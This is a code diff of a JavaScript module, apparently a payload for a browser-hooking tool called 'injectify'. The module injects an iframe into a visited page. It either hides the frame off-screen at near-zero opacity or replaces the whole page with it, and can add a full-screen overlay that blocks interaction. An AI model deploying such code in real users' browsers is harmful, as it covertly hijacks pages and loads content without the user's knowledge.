@@ -22,27 +22,31 @@ if (injectify.info.platform === 'browser') {
      * - difficulties when dynamically changing the src attribute
      */
     var embed = document.createElement('iframe')
-    embed.src = url
+    if (url) embed.src = url
 
     /**
      * Set embed attributes
      */
     embed.id = id
     embed.frameBorder = 0
+
+    /**
+     * Set the style
+     */
     if (hidden) {
         embed.style = 'width: 100px; height: 100px; left: -100vw; top: -100vh; opacity: 0.01; position: absolute;'
     } else {
         embed.style = 'width: 100vw; height: 100vh;'
-    }
 
-    /**
-     * Allow the embed to go fullscreen
-     */
-    embed.setAttribute('allowfullscreen', 'allowfullscreen')
-    embed.setAttribute('mozallowfullscreen', 'mozallowfullscreen')
-    embed.setAttribute('msallowfullscreen', 'msallowfullscreen')
-    embed.setAttribute('oallowfullscreen', 'oallowfullscreen')
-    embed.setAttribute('webkitallowfullscreen', 'webkitallowfullscreen')
+        /**
+         * Allow the embed to go fullscreen
+         */
+        embed.setAttribute('allowfullscreen', 'allowfullscreen')
+        embed.setAttribute('mozallowfullscreen', 'mozallowfullscreen')
+        embed.setAttribute('msallowfullscreen', 'msallowfullscreen')
+        embed.setAttribute('oallowfullscreen', 'oallowfullscreen')
+        embed.setAttribute('webkitallowfullscreen', 'webkitallowfullscreen')
+    }
 
     /**
      * Set the viewport correctly - otherwise page will appear "zoomed-out"
@@ -56,7 +60,6 @@ if (injectify.info.platform === 'browser') {
      */
     if (hidden) {
         document.body.appendChild(embed)
-        document.head.appendChild(meta)
     } else {
         document.body.innerHTML = embed.outerHTML
         document.head.innerHTML = meta.outerHTML
@@ -65,17 +68,19 @@ if (injectify.info.platform === 'browser') {
     /**
      * Prevent interaction with the embed
      */
-    if (typeof module.params == 'object' && module.params.interaction == false) {
+    if (!hidden && typeof module.params == 'object' && module.params.interaction == false) {
         var blocker = document.createElement('div')
         blocker.style = 'position: absolute; width: 100vw; height: 100vh; top: 0; z-index: 999'
         document.body.appendChild(blocker)
     }
-    document.body.style = `
-    margin: 0 !important;
-    width: 100% !important;
-    height: 100% !important;
-    overflow: hidden !important;
-    rickrolled: true !important;`
+    if (!hidden) {
+        document.body.style = `
+        margin: 0 !important;
+        width: 100% !important;
+        height: 100% !important;
+        overflow: hidden !important;
+        rickrolled: true !important;`
+    }
     module.return(document.getElementById(id))
 } else {
     /**
